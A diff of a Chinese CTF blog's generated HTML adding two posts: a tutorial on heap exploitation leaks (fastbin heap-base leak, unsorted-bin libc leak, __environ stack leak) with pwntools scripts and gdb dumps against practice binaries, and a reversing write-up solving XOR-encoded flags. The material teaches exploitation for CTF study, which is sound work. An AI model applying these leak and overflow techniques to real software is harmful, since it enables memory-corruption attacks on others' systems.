@@ -79,7 +79,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">八月 2018</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">五月 2018</a><span class="archive-list-count">1</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">八月 2018</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">五月 2018</a><span class="archive-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -91,6 +91,10 @@
       <ul>
         
           <li>
+            <a href="/2018/08/31/堆中获取地址和劫持执行流的方法/">堆中获取地址和劫持执行流的方法</a>
+          </li>
+        
+          <li>
             <a href="/2018/08/30/ISG-babynote/">ISG(babynote)</a>
           </li>
         
@@ -99,15 +103,11 @@
           </li>
         
           <li>
+            <a href="/2018/08/26/王鼎杯-教育/">网鼎杯-教育</a>
+          </li>
+        
+          <li>
             <a href="/2018/08/26/极客巅峰/">极客巅峰</a>
-          </li>
-        
-          <li>
-            <a href="/2018/08/23/House-Of-Einherjar-2016-Seccon-tinypad/">House Of Einherjar(2016 Seccon tinypad)</a>
-          </li>
-        
-          <li>
-            <a href="/2018/08/21/通用gatget/">通用gatget</a>
           </li>
         
       </ul>
@@ -119,7 +119,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/double-free-unlink/">double free,unlink</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/基础知识/">基础知识</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/堆溢出-house-of-einherjar/">堆溢出,house of einherjar</a><span class="tag-list-count">1</span></li></ul>
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/double-free-unlink/">double free,unlink</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/基础知识/">基础知识</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/堆溢出-house-of-einherjar/">堆溢出,house of einherjar</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/技巧，堆溢出，总结/">技巧，堆溢出，总结</a><span class="tag-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -128,7 +128,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/double-free-unlink/" style="font-size: 10px;">double free,unlink</a> <a href="/tags/基础知识/" style="font-size: 10px;">基础知识</a> <a href="/tags/堆溢出-house-of-einherjar/" style="font-size: 10px;">堆溢出,house of einherjar</a>
+      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/double-free-unlink/" style="font-size: 10px;">double free,unlink</a> <a href="/tags/基础知识/" style="font-size: 10px;">基础知识</a> <a href="/tags/堆溢出-house-of-einherjar/" style="font-size: 10px;">堆溢出,house of einherjar</a> <a href="/tags/技巧，堆溢出，总结/" style="font-size: 10px;">技巧，堆溢出，总结</a>
     </div>
   </div>
 
@@ -151,6 +151,60 @@
 </aside>
         
         <section id="main">
+  
+    <article id="post-堆中获取地址和劫持执行流的方法" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/08/31/堆中获取地址和劫持执行流的方法/" class="article-date">
+  <time datetime="2018-08-31T01:45:55.000Z" itemprop="datePublished">2018-08-31</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/31/堆中获取地址和劫持执行流的方法/">堆中获取地址和劫持执行流的方法</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>栗子<a href="https://github.com/tower111/software.git" target="_blank" rel="noopener">https://github.com/tower111/software.git</a><br><strong>0x01获取栈地址</strong><br>原理：在fast bin是单链在内存中保存，在fd位置处会写入next chunk的地址，这个地址可以用来获取heap_base。<br>栗子：babynote<br>需要：UAF漏洞，有show函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">def add(size,content):</span><br><span class="line">    p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line">    p.recvuntil(&quot;input size:&quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&quot;Note:&quot;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(&quot;Done!&quot;)</span><br><span class="line"></span><br><span class="line">def show(ID):</span><br><span class="line">    p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line">    p.recvuntil(&quot;Index:&quot;)</span><br><span class="line">    p.sendline(str(ID))</span><br><span class="line"></span><br><span class="line">def edit(ID,content):</span><br><span class="line">    p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">    p.sendline(&quot;3&quot;)</span><br><span class="line">    p.recvuntil(&quot;Index:&quot;)</span><br><span class="line">    p.sendline(str(ID))</span><br><span class="line">    p.recvuntil(&quot;Note:&quot;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(&quot;Done!&quot;)</span><br><span class="line"></span><br><span class="line">def delete(ID):</span><br><span class="line">    p.recvuntil(&quot;&gt; &quot;)</span><br><span class="line">    p.sendline(&quot;4&quot;)</span><br><span class="line">    p.recvuntil(&quot;Index:&quot;)</span><br><span class="line">    p.sendline(str(ID))</span><br><span class="line">#########################################leak</span><br><span class="line">add(0x20,&quot;AAAA&quot;)</span><br><span class="line">add(0x20,&quot;BBBB&quot;)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line">show(0)</span><br><span class="line">p.recvuntil(&quot;Note:&quot;)</span><br><span class="line">main_arena=u64(p.recvuntil(&apos;\x0a&apos;,drop=True).ljust(8,&quot;\x00&quot;))</span><br><span class="line">print &quot;heap_base=&quot;+hex(heap_base)</span><br><span class="line">print &quot;main_arena=&quot;+hex(main_arena)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x2233000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x31, </span><br><span class="line">  fd = 0x2233030, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x2233030 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x31, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>输出chunk1的内容即可。</p>
+<hr>
+<p><strong>0x02获取libc地址</strong></p>
+<p>原理：unsort bin是双向链表，如果只有一个chunk fd和bk都是main_arena+偏移。如果是多个就按照双向链表链起来（头和尾都是main_arena+偏移）<br>栗子：babynote<br>需要：UAF漏洞，有show函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(0x100,&quot;A&quot;)</span><br><span class="line">delete(0)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">show(0)</span><br><span class="line">p.recvuntil(&quot;Note:&quot;)</span><br><span class="line">main_arena=u64(p.recvuntil(&apos;\x0a&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &quot;main_arena=&quot;+hex(main_arena)</span><br><span class="line">libc_base=main_arena-0x3c4b78</span><br><span class="line">system_addr=libc_base+libc.symbols[&apos;system&apos;]</span><br><span class="line">print &quot;system_addr=&quot;+hex(system_addr)</span><br></pre></td></tr></table></figure></p>
+<p>多加一个chunk可以防止top chunk回收(在本次泄露中top chunk回收是不影响的)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x15ef000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x21001, </span><br><span class="line">  fd = 0x7feb37b7cb78 &lt;main_arena+88&gt;, </span><br><span class="line">  bk = 0x7feb37b7cb78 &lt;main_arena+88&gt;, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>输出的main_arena=0x7f0ddf83eb78<br>输出这个chunk的内容即可泄露main_arena的地址，但是要怎么获取libc的地址？</p>
+<p>让程序暂停，（gdb.attach(p)或者是raw_input()都可以）<br>可以用pidof来获取到pid<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">VirtualBox:~$ pidof babynote </span><br><span class="line">3888</span><br></pre></td></tr></table></figure></p>
+<p>可以查看各个模块的加载地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">VirtualBox:~$ cat /proc/3888/maps</span><br><span class="line">00400000-00401000 r-xp 00000000 08:01 394527                             /home/liu/Desktop/babynote</span><br><span class="line">00601000-00602000 r--p 00001000 08:01 394527                             /home/liu/Desktop/babynote</span><br><span class="line">00602000-00603000 rw-p 00002000 08:01 394527                             /home/liu/Desktop/babynote</span><br><span class="line">02588000-025a9000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">7f0ddf47a000-7f0ddf63a000 r-xp 00000000 08:01 457287                     /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7f0ddf63a000-7f0ddf83a000 ---p 001c0000 08:01 457287                     /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7f0ddf83a000-7f0ddf83e000 r--p 001c0000 08:01 457287                     /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7f0ddf83e000-7f0ddf840000 rw-p 001c4000 08:01 457287                     /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">7f0ddf840000-7f0ddf844000 rw-p 00000000 00:00 0 </span><br><span class="line">7f0ddf844000-7f0ddf86a000 r-xp 00000000 08:01 457280                     /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">7f0ddfa4a000-7f0ddfa4d000 rw-p 00000000 00:00 0 </span><br><span class="line">7f0ddfa69000-7f0ddfa6a000 r--p 00025000 08:01 457280                     /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">7f0ddfa6a000-7f0ddfa6b000 rw-p 00026000 08:01 457280                     /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">7f0ddfa6b000-7f0ddfa6c000 rw-p 00000000 00:00 0 </span><br><span class="line">7fff1183f000-7fff11860000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">7fff119d7000-7fff119d9000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7fff119d9000-7fff119db000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br></pre></td></tr></table></figure></p>
+<p>0x7f0ddf47a000这个地址就是libc的实际加载地址，它和main_arena的偏移是固定的。</p>
+<p>offset=hex(0x7f0ddf83eb78-0x7f0ddf47a000)=0x3c4b78 加载地址会变但是这个偏移是不会变的，这样可以获取到远程的libc的加载地址。</p>
+<hr>
+<p><strong>0x03获取栈地址</strong><br>原理：libc中有一个函数叫__environ指向的位置是栈中环境变量的地址。<br>栗子：GUESS<br>需要：libc地址，写入一个地址，能够输出这个地址处的内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line"></span><br><span class="line">p=process(&quot;./guess&quot;)</span><br><span class="line">elf=ELF(&quot;./guess&quot;)	</span><br><span class="line">libc=ELF(&quot;libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Please type your guessing flag\n&quot;)</span><br><span class="line">payload=&apos;A&apos;*0x128+p64(elf.got[&quot;read&quot;])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">print p.recvuntil(&quot;***: &quot;)</span><br><span class="line">read_addr=u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &quot;read_addr=&quot;+hex(read_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Please type your guessing flag\n&quot;)</span><br><span class="line">environ_pointer=read_addr-libc.symbols[&quot;read&quot;]+libc.symbols[&quot;__environ&quot;]</span><br><span class="line">payload=&apos;A&apos;*0x128+p64(environ_pointer)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">print p.recvuntil(&quot;***: &quot;)</span><br><span class="line">environ_addr=u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &quot;environ_pointer=&quot;+hex(environ_pointer)</span><br><span class="line">print &quot;environ_addr=&quot;+hex(environ_addr)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>泄露出read函数地址然后计算出__environ的地址，写入之后泄露出栈中环境变量的起始地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 100</span><br><span class="line">00:0000│ rsp    0x7ffe2cc4e568 —▸ 0x400b70 ◂— mov    rax, qword ptr [rbp - 0x80]</span><br><span class="line">01:0008│        0x7ffe2cc4e570 —▸ 0x7ffe2cc4e6f8 —▸ 0x7ffe2cc501fa ◂— 0x73736575672f2e /* &apos;./guess&apos; */</span><br><span class="line">02:0010│        0x7ffe2cc4e578 ◂— 0x100000000</span><br><span class="line">03:0018│ rsi-4  0x7ffe2cc4e580 ◂— 0x8600000000</span><br><span class="line">04:0020│        0x7ffe2cc4e588 ◂— 0x109300000003</span><br><span class="line">05:0028│        0x7ffe2cc4e590 ◂— 0x3</span><br><span class="line">... ↓</span><br><span class="line">07:0038│        0x7ffe2cc4e5a0 ◂— &apos;qwertyuiop\n&apos;</span><br><span class="line"></span><br><span class="line">                ......</span><br><span class="line">                </span><br><span class="line">31:0188│ r13    0x7ffe2cc4e6f0 ◂— 0x1</span><br><span class="line">32:0190│        0x7ffe2cc4e6f8 —▸ 0x7ffe2cc501fa ◂— 0x73736575672f2e /* &apos;./guess&apos; */</span><br><span class="line">33:0198│        0x7ffe2cc4e700 ◂— 0x0</span><br><span class="line">34:01a0│        0x7ffe2cc4e708 —▸ 0x7ffe2cc50202 ◂— 0x52454d554e5f434c (&apos;LC_NUMER&apos;)</span><br><span class="line">35:01a8│        0x7ffe2cc4e710 —▸ 0x7ffe2cc50219 ◂— 0x505f4150515f5451 (&apos;QT_QPA_P&apos;)</span><br><span class="line">36:01b0│        0x7ffe2cc4e718 —▸ 0x7ffe2cc5023a ◂— 0x454552475f474458 (&apos;XDG_GREE&apos;)</span><br><span class="line">37:01b8│        0x7ffe2cc4e720 —▸ 0x7ffe2cc50269 ◂— 0x45445f454d4f4e47 (&apos;GNOME_DE&apos;)</span><br><span class="line">38:01c0│        0x7ffe2cc4e728 —▸ 0x7ffe2cc50295 ◂— 0x544e4544495f434c (&apos;LC_IDENT&apos;)</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/08/31/堆中获取地址和劫持执行流的方法/" data-id="cjlhi0i870004j4l3wpmwd2k6" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/技巧，堆溢出，总结/">技巧，堆溢出，总结</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
   
     <article id="post-ISG-babynote" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -195,7 +249,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/30/ISG-babynote/" data-id="cjlgo9z020001asl3vt4h08zf" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/08/30/ISG-babynote/" data-id="cjlhi0i8x000jj4l3h5qnw40s" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/double-free-unlink/">double free,unlink</a></li></ul>
@@ -242,10 +296,79 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/28/FILE结构/" data-id="cjlgo9yzy0000asl3pycnentu" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/08/28/FILE结构/" data-id="cjlhi0i7z0000j4l39lf4nreu" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/基础知识/">基础知识</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-王鼎杯-教育" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/08/26/王鼎杯-教育/" class="article-date">
+  <time datetime="2018-08-26T10:03:53.000Z" itemprop="datePublished">2018-08-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/26/王鼎杯-教育/">网鼎杯-教育</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><strong>beijing</strong><br><img src="http://i2.bvimg.com/659021/b8fb11c5fce04da4.png" alt="image0001"><br>这里可以发现有flag的影子，但是异或之后就没有影子了，获取flag其实就是把异或的部分去掉。</p>
+<p><img src="http://i2.bvimg.com/659021/b23dac987cfc5362.png" alt="image0001"><br>这里就是算法了。<br>别人写的比较好，用别人的吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#include</span><br><span class="line">using namespace std;</span><br><span class="line">unsigned int byte_804A020[28] = &#123;</span><br><span class="line">    0x61, 0x4C, 0x67, 0x59, 0x69, 0x29, 0x6E, 0x42, 0x62, 0x0D, 0x65, 0x71, 0x66, 0x34, 0x6A, 0xC6, </span><br><span class="line">    0x6D, 0x8A, 0x6C, 0x7F, 0x7B, 0xAE, 0x7A, 0x92, 0x7D, 0xEC, 0x5F, 0x57</span><br><span class="line">&#125;;</span><br><span class="line">char chr_change(char temp)</span><br><span class="line">&#123;</span><br><span class="line">  char chr_re;</span><br><span class="line">  switch(temp)</span><br><span class="line">  &#123;</span><br><span class="line">    case 0:</span><br><span class="line">      chr_re=(char)byte_804A020[0];</span><br><span class="line">      break;</span><br><span class="line">    case 1:</span><br><span class="line">      chr_re=(char)byte_804A020[2];</span><br><span class="line">      break;</span><br><span class="line">    case 2:</span><br><span class="line">      chr_re=(char)byte_804A020[4];</span><br><span class="line">      break;</span><br><span class="line">    case 3:</span><br><span class="line">      chr_re=(char)byte_804A020[6];</span><br><span class="line">      break;</span><br><span class="line">    case 4:</span><br><span class="line">      chr_re=(char)byte_804A020[8];</span><br><span class="line">      break;</span><br><span class="line">    case 5:</span><br><span class="line">      chr_re=(char)byte_804A020[10];</span><br><span class="line">      break;</span><br><span class="line">    case 6:</span><br><span class="line">      chr_re=(char)byte_804A020[12];</span><br><span class="line">      break;</span><br><span class="line">    case 7:</span><br><span class="line">      chr_re=(char)byte_804A020[14];</span><br><span class="line">      break;</span><br><span class="line">    case 8:</span><br><span class="line">      chr_re=(char)byte_804A020[16];</span><br><span class="line">      break;</span><br><span class="line">    case 9:</span><br><span class="line">      chr_re=(char)byte_804A020[18];</span><br><span class="line">      break;</span><br><span class="line">    case 10:</span><br><span class="line">      chr_re=(char)byte_804A020[20];</span><br><span class="line">      break;</span><br><span class="line">    case 11:</span><br><span class="line">      chr_re=(char)byte_804A020[22];</span><br><span class="line">      break;</span><br><span class="line">    case 12:</span><br><span class="line">      chr_re=(char)byte_804A020[24];</span><br><span class="line">      break;</span><br><span class="line">    case 13:</span><br><span class="line">      chr_re=(char)byte_804A020[26];</span><br><span class="line">      break;</span><br><span class="line">    default:</span><br><span class="line">      chr_re=0;</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  cout&lt;&lt;chr_re;</span><br><span class="line">  return chr_re;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int t[25]=&#123;0x06,0x09,0x00,0x01,0x0A,0x00,0x08,0x00,0x0B,0x02,0x03,0x01,0x0D,0x04,0x05,0x02,0x07,0x02,0x03,0x01,0x0c&#125;;</span><br><span class="line">    for(int i=0;i&lt;21;i++)</span><br><span class="line">        chr_change(t[i]);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>那一串数据也能得到(有三个字节是在bss段，其实是0)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">a1=[ 0x61, 0x4C, 0x67, 0x59, 0x69, 0x29, 0x6E, 0x42, 0x62, 0x0D,</span><br><span class="line">  0x65, 0x71, 0x66, 0x34, 0x6A, 0xC6, 0x6D, 0x8A, 0x6C, 0x7F,</span><br><span class="line">  0x7B, 0xAE, 0x7A, 0x92, 0x7D, 0xEC, 0x5F, 0x57]</span><br><span class="line">b=[]</span><br><span class="line">key=[0x52 ,0x13 ,0x2D ,0x3E ,0xD5 ,0x2D ,0xE7 ,0x2D ,0xE8 ,0x40 ,0x2C ,0x3E ,0x08 ,0x6F ,0x14 ,0x40</span><br><span class="line">     ,0xAC ,0x40 ,0x2C ,0x3E ,0x91 ,0x0A]</span><br><span class="line">print key,</span><br><span class="line">print len(key)</span><br><span class="line">for i in range(len(a1)/2):</span><br><span class="line">    b.append(chr((a1[2*i]^a1[2*i+1])&amp;0xff))</span><br><span class="line">print len(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(len(key)):</span><br><span class="line">    for j in range(len(b)):</span><br><span class="line">        if key[i]==ord(b[j]):</span><br><span class="line">            print j,</span><br></pre></td></tr></table></figure></p>
+<p>总结：注意题目中出现的数字，变成字符之后会有意外收获呢。</p>
+<hr>
+<p><strong>advance</strong><br>运行之后输出了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  advanced ./src</span><br><span class="line">welcome, here is your identification, please keep it in your pocket: 4b404c4b5648725b445845734c735949405c414d5949725c45495a51</span><br></pre></td></tr></table></figure></p>
+<p>这个字符串可能有意义。<br>用ida打开之后发现函数贼多，没办法，只能祈祷简单一点，测试吧。<br>libnum库了解一下<a href="https://www.cnblogs.com/pcat/p/7225782.html" target="_blank" rel="noopener">https://www.cnblogs.com/pcat/p/7225782.html</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import libnum</span><br><span class="line">&gt;&gt;&gt; s=0x4b404c4b5648725b445845734c735949405c414d5949725c45495a51</span><br><span class="line">&gt;&gt;&gt; print libnum.n2s(s)</span><br><span class="line">K@LKVHr[DXEsLsYI@\AMYIr\EIZQ</span><br></pre></td></tr></table></figure></p>
+<p>转成字符是乱码，但是能转成字符，简单异或一下试试。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ord(&apos;f&apos;)^0x4b</span><br><span class="line">45</span><br><span class="line">&gt;&gt;&gt; ord(&apos;l&apos;)^0x40</span><br><span class="line">44</span><br><span class="line">&gt;&gt;&gt; ord(&apos;a&apos;)^0x4c</span><br><span class="line">45</span><br><span class="line">&gt;&gt;&gt; ord(&apos;g&apos;)^0x4b</span><br><span class="line">44</span><br></pre></td></tr></table></figure></p>
